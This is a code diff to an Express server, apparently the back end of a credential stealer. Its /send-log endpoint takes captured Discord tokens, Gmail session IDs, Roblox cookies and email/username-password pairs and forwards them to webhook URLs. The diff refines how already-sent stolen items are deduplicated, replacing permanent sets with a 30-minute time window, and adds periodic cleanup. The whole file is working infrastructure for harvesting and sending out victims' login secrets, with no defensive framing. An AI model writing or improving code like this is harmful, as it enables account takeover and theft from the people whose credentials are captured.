@@ -5,11 +5,37 @@ const app = express();
 const PORT = process.env.PORT || 5000;
 const HOST = '0.0.0.0';
 
-// Global tracking to prevent duplicate sends
-const sentTokens = new Set(); // Track sent Discord tokens
-const sentSIDs = new Set(); // Track sent Gmail SIDs
-const sentRobloxCookies = new Set(); // Track sent Roblox cookies
-const sentCredentials = new Set(); // Track sent credentials (all services)
+// Global tracking to prevent duplicate sends with time-based expiration
+const sentTokens = new Map(); // Track sent Discord tokens with timestamps
+const sentSIDs = new Map(); // Track sent Gmail SIDs with timestamps
+const sentRobloxCookies = new Map(); // Track sent Roblox cookies with timestamps
+const sentCredentials = new Map(); // Track sent credentials with timestamps
+
+// Time window for deduplication (30 minutes)
+const DEDUPLICATION_WINDOW = 30 * 60 * 1000; // 30 minutes in milliseconds
+
+// Function to check if an item was recently sent
+function wasRecentlySent(trackingMap, key) {
+  if (!trackingMap.has(key)) {
+    return false;
+  }
+  
+  const timestamp = trackingMap.get(key);
+  const now = Date.now();
+  
+  // If it's been more than the deduplication window, allow it
+  if (now - timestamp > DEDUPLICATION_WINDOW) {
+    trackingMap.delete(key); // Clean up old entry
+    return false;
+  }
+  
+  return true;
+}
+
+// Function to mark an item as sent
+function markAsSent(trackingMap, key) {
+  trackingMap.set(key, Date.now());
+}
 
 // Middleware
 app.use(cors());
@@ -475,21 +501,21 @@ app.post('/send-log', async (req, res) => {
     // Handle Discord captures
     if (logData.level === 'discord_captured' && logData.token) {
       const tokenHash = generateTokenHash(logData.token, 'discord');
-      if (tokenHash && sentTokens.has(tokenHash)) {
+      if (tokenHash && wasRecentlySent(sentTokens, tokenHash)) {
         shouldSkip = true;
         skipReason = 'Discord token already sent';
       } else if (tokenHash) {
-        sentTokens.add(tokenHash);
+        markAsSent(sentTokens, tokenHash);
       }
 
       // Also check credentials if available
       if (logData.credentials && !shouldSkip) {
         const credHash = generateCredentialHash(logData.credentials, 'discord');
-        if (credHash && sentCredentials.has(credHash)) {
+        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
           shouldSkip = true;
           skipReason = 'Discord credentials already sent';
         } else if (credHash) {
-          sentCredentials.add(credHash);
+          markAsSent(sentCredentials, credHash);
         }
       }
     }
@@ -497,15 +523,15 @@ app.post('/send-log', async (req, res) => {
     // Handle Discord login credentials
     if (logData.level === 'discord_login') {
       // Extract credentials from message
-      const messageMatch = logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
+      const messageMatch = logData.message && logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
       if (messageMatch) {
         const credentials = { email: messageMatch[1], password: messageMatch[2] };
         const credHash = generateCredentialHash(credentials, 'discord');
-        if (credHash && sentCredentials.has(credHash)) {
+        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
           shouldSkip = true;
           skipReason = 'Discord login credentials already sent';
         } else if (credHash) {
-          sentCredentials.add(credHash);
+          markAsSent(sentCredentials, credHash);
         }
       }
     }
@@ -513,21 +539,21 @@ app.post('/send-log', async (req, res) => {
     // Handle Gmail captures
     if (logData.level === 'gmail_captured' && logData.sid) {
       const sidHash = generateTokenHash(logData.sid, 'gmail');
-      if (sidHash && sentSIDs.has(sidHash)) {
+      if (sidHash && wasRecentlySent(sentSIDs, sidHash)) {
         shouldSkip = true;
         skipReason = 'Gmail SID already sent';
       } else if (sidHash) {
-        sentSIDs.add(sidHash);
+        markAsSent(sentSIDs, sidHash);
       }
 
       // Also check credentials if available
       if (logData.credentials && !shouldSkip) {
         const credHash = generateCredentialHash(logData.credentials, 'gmail');
-        if (credHash && sentCredentials.has(credHash)) {
+        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
           shouldSkip = true;
           skipReason = 'Gmail credentials already sent';
         } else if (credHash) {
-          sentCredentials.add(credHash);
+          markAsSent(sentCredentials, credHash);
         }
       }
     }
@@ -535,37 +561,37 @@ app.post('/send-log', async (req, res) => {
     // Handle Gmail login credentials
     if (logData.level === 'gmail_login') {
       // Extract credentials from message
-      const messageMatch = logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
+      const messageMatch = logData.message && logData.message.match(/Email:\s*(.+?),\s*Password:\s*(.+)/);
       if (messageMatch) {
         const credentials = { email: messageMatch[1], password: messageMatch[2] };
         const credHash = generateCredentialHash(credentials, 'gmail');
-        if (credHash && sentCredentials.has(credHash)) {
+        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
           shouldSkip = true;
           skipReason = 'Gmail login credentials already sent';
         } else if (credHash) {
-          sentCredentials.add(credHash);
+          markAsSent(sentCredentials, credHash);
         }
       }
     }
 
-    // Handle Roblox combined (existing deduplication enhanced)
+    // Handle Roblox combined (with time-based deduplication)
     if (logData.level === 'roblox_combined' && logData.cookie) {
       const cookieHash = generateTokenHash(logData.cookie, 'roblox');
-      if (cookieHash && sentRobloxCookies.has(cookieHash)) {
+      if (cookieHash && wasRecentlySent(sentRobloxCookies, cookieHash)) {
         shouldSkip = true;
         skipReason = 'Roblox cookie already sent';
       } else if (cookieHash) {
-        sentRobloxCookies.add(cookieHash);
+        markAsSent(sentRobloxCookies, cookieHash);
       }
 
       // Also check credentials
       if (logData.credentials && !shouldSkip) {
         const credHash = generateCredentialHash(logData.credentials, 'roblox');
-        if (credHash && sentCredentials.has(credHash)) {
+        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
           shouldSkip = true;
           skipReason = 'Roblox credentials already sent';
         } else if (credHash) {
-          sentCredentials.add(credHash);
+          markAsSent(sentCredentials, credHash);
         }
       }
     }
@@ -573,15 +599,15 @@ app.post('/send-log', async (req, res) => {
     // Handle Roblox login credentials
     if (logData.level === 'roblox_login') {
       // Extract credentials from message
-      const messageMatch = logData.message.match(/Username:\s*(.+?),\s*Password:\s*(.+)/);
+      const messageMatch = logData.message && logData.message.match(/Username:\s*(.+?),\s*Password:\s*(.+)/);
       if (messageMatch) {
         const credentials = { username: messageMatch[1], password: messageMatch[2] };
         const credHash = generateCredentialHash(credentials, 'roblox');
-        if (credHash && sentCredentials.has(credHash)) {
+        if (credHash && wasRecentlySent(sentCredentials, credHash)) {
           shouldSkip = true;
           skipReason = 'Roblox login credentials already sent';
         } else if (credHash) {
-          sentCredentials.add(credHash);
+          markAsSent(sentCredentials, credHash);
         }
       }
     }
@@ -1322,6 +1348,22 @@ app.get('/health', (req, res) => {
   res.json({ status: 'OK', timestamp: new Date().toISOString() });
 });
 
+// Cleanup old entries every 10 minutes
+setInterval(() => {
+  const now = Date.now();
+  const maps = [sentTokens, sentSIDs, sentRobloxCookies, sentCredentials];
+  
+  maps.forEach(map => {
+    for (const [key, timestamp] of map.entries()) {
+      if (now - timestamp > DEDUPLICATION_WINDOW) {
+        map.delete(key);
+      }
+    }
+  });
+  
+  console.log('Cleaned up old deduplication entries');
+}, 10 * 60 * 1000); // Every 10 minutes
+
 // Start server
 app.listen(PORT, '0.0.0.0', () => {
   console.log(`Webhook service running on port ${PORT}`);
@@ -1329,4 +1371,5 @@ app.listen(PORT, '0.0.0.0', () => {
   console.log(`- Roblox: ${ROBLOX_WEBHOOK_URL ? 'Yes' : 'No'}`);
   console.log(`- Gmail: ${GMAIL_WEBHOOK_URL ? 'Yes' : 'No'}`);
   console.log(`- Discord: ${DISCORD_WEBHOOK_URL ? 'Yes' : 'No'}`);
+  console.log(`Deduplication window: ${DEDUPLICATION_WINDOW / 60000} minutes`);
 });
